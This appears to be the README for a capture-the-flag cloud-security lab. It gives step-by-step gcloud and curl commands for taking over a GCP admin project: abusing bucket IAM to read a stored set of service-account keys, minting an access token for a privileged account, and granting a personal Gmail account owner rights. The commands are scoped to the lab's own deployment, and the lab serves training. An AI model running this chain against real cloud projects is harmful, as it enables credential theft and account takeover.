# Lab 03 — Admin Project Takeover via IAM Abuse

**Type:** Security / CTF  
**Project:** `$DEPLOYMENT_UID-admin-palu`  
**Prerequisite:** Complete lab-02 Stage 7 — you should have the `projects_scanner` SA key JSON extracted from BigQuery.

---

## Scenario

You have obtained a service account key for `projects_scanner` from the BigQuery table in `$DEPLOYMENT_UID-webapp-palu`. This SA was created by lab-02 with `roles/browser` on the webapp project. Your new target is a separate admin project — `$DEPLOYMENT_UID-admin-palu` — where `projects_scanner` has been granted a custom role that lets it manage GCS bucket IAM policies.

The admin project contains a credentials bucket with 10 service account keys. Somewhere among them is a credential that can impersonate the project's most privileged service account. That account's token is the only thing that can retrieve the final flag.

---

## Starting position

```
Credential: projects_scanner SA key (from lab-02 BigQuery table)
Project:    $DEPLOYMENT_UID-admin-palu
```

Activate your starting credential:

```bash
gcloud auth activate-service-account \
  --key-file=projects_scanner_key.json
gcloud config set project $DEPLOYMENT_UID-admin-palu
```

Verify your permissions:

```bash
gcloud projects get-iam-policy $DEPLOYMENT_UID-admin-palu \
  --flatten="bindings[].members" \
  --filter="bindings.members:serviceAccount:$(gcloud config get-value account)" \
  --format="table(bindings.role)"
```

You should see the `bucket_policy_manager` custom role. Note that it does **not** include `storage.objects.get` — you cannot read bucket contents yet.

---

## Kill Chain

### Stage 1 — Bucket IAM Abuse

List GCS buckets in the admin project:

```bash
gcloud storage buckets list --project=$DEPLOYMENT_UID-admin-palu
```

You will find `$DEPLOYMENT_UID-admin-credentials`. You have `storage.buckets.setIamPolicy` — use it to grant yourself object read access:

```bash
gcloud storage buckets add-iam-policy-binding \
  gs://$DEPLOYMENT_UID-admin-credentials \
  --member="serviceAccount:$(gcloud config get-value account)" \
  --role="roles/storage.objectViewer"
```

Now download the credentials document:

```bash
gcloud storage cp \
  gs://$DEPLOYMENT_UID-admin-credentials/service-accounts.json \
  ./service-accounts.json
```

The file contains a JSON array of 10 service account credential objects.

---

### Stage 2 — Token Generation

Extract each credential from `service-accounts.json` and save them as individual key files. Then test each one:

```bash
# For each extracted key file:
gcloud auth activate-service-account --key-file=sa_key_N.json
gcloud iam service-accounts list --project=$DEPLOYMENT_UID-admin-palu
```

Nine of the credentials will return a `403 Permission Denied`. One — at position 5 in the array — will succeed. Note the email addresses returned by the SA list.

Find `admin-owner@$DEPLOYMENT_UID-admin-palu.iam.gserviceaccount.com` in the list. The `token-generator` SA you are now authenticated as has `roles/iam.serviceAccountTokenCreator` scoped to that SA. Generate a short-lived access token for it:

```bash
curl -s -X POST \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/admin-owner@$DEPLOYMENT_UID-admin-palu.iam.gserviceaccount.com:generateAccessToken" \
  -H "Content-Type: application/json" \
  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}'
```

Copy the `accessToken` from the response.

---

### Stage 3 — IAM Binding

Configure `gcloud` to use the `admin-owner` access token:

```bash
gcloud config set auth/access_token <ADMIN_OWNER_ACCESS_TOKEN>
```

`admin-owner` holds `roles/resourcemanager.projectIamAdmin`. This lets it call `setIamPolicy` — but the role deliberately excludes `serviceusage.services.enable`, so it cannot enable APIs programmatically.

Use the token to grant your personal Gmail account `roles/owner` on the admin project:

```bash
gcloud projects add-iam-policy-binding $DEPLOYMENT_UID-admin-palu \
  --member="user:<YOUR_GMAIL_ADDRESS>" \
  --role="roles/owner"
```

---

### Stage 4 — Enable Secret Manager API

The Secret Manager API is disabled in this project. Your Gmail account now has `roles/owner`, but `admin-owner`'s token cannot call `serviceusage.services.enable`.

Log into the [GCP Console](https://console.cloud.google.com) with your personal Gmail account, switch to the `$DEPLOYMENT_UID-admin-palu` project, and navigate to **APIs & Services → Library**. Search for **Secret Manager API** and enable it.

Alternatively, with your Gmail account authenticated via ADC:

```bash
gcloud auth login <YOUR_GMAIL_ADDRESS>
gcloud services enable secretmanager.googleapis.com \
  --project=$DEPLOYMENT_UID-admin-palu
```

---

### Stage 5 — Final Flag

Switch back to the `admin-owner` access token and read the flag:

```bash
gcloud config set auth/access_token <ADMIN_OWNER_ACCESS_TOKEN>

gcloud secrets versions access latest \
  --secret=$DEPLOYMENT_UID-admin-flag \
  --project=$DEPLOYMENT_UID-admin-palu
```

> **Note (org deployments):** A `flag_secret_guard` IAM Deny Policy blocks all principals except the `admin-owner` SA from accessing the secret — including your Gmail project owner. Only the `admin-owner` access token retrieved in Stage 2 succeeds. If the token has expired (~1 hour), regenerate it using Stage 2's `generateAccessToken` call.

> **Note (non-org deployments):** `flag_secret_guard` is disabled (`enable_deny_policies = false`). Your Gmail project owner can also read the flag directly after Stage 4. The kill chain teaches the same IAM abuse and token generation techniques regardless.

---

## Resources deployed

| Resource | Name | Purpose |
|----------|------|---------|
| Custom role | `bucket_policy_manager` | Entry role for `projects_scanner` — list + setIAMPolicy on GCS, no object read |
| Custom role | `sa_lister` | Granted to `token-generator` — list/get SAs, read project IAM policy |
| Service account | `admin-owner` | High-value target; holds `roles/resourcemanager.projectIamAdmin` |
| Service account | `token-generator` | Valid credential (position 5); has Token Creator on `admin-owner` |
| Service accounts | `sa-decoy-00..08` | 9 decoys; authenticate but have no useful permissions |
| GCS bucket | `$UID-admin-credentials` | Holds `service-accounts.json` with 10 SA keys |
| Secret Manager secret | `$UID-admin-flag` | Final flag; API disabled post-deploy |
| IAM Deny Policy | `$UID-flag-secret-guard` | (org only) Restricts secret access to `admin-owner` SA |

---

## Terraform inputs

| Variable | Description |
|----------|-------------|
| `project_id` | Admin project ID (`$UID-admin-palu`) |
| `deployment_uid` | Shared UID from lab-01 output |
| `projects_scanner_sa_email` | Entry SA email from lab-02 output |
| `enable_deny_policies` | `true` only for GCP Organization deployments |
| `flag` | Flag string stored in the secret (has default) |

## Terraform outputs

| Output | Description |
|--------|-------------|
| `deployment_uid` | Shared deployment UID |
| `admin_owner_sa_email` | `admin-owner` SA email |
| `token_generator_sa_email` | `token-generator` SA email (instructor reference) |
| `credentials_bucket` | GCS bucket name |
| `flag_secret_name` | Secret Manager secret ID |
| `re_enable_sm_api_command` | `gcloud` command to re-enable Secret Manager API |
| `flag_access_command` | `gcloud` command to read the flag (Stage 5) |
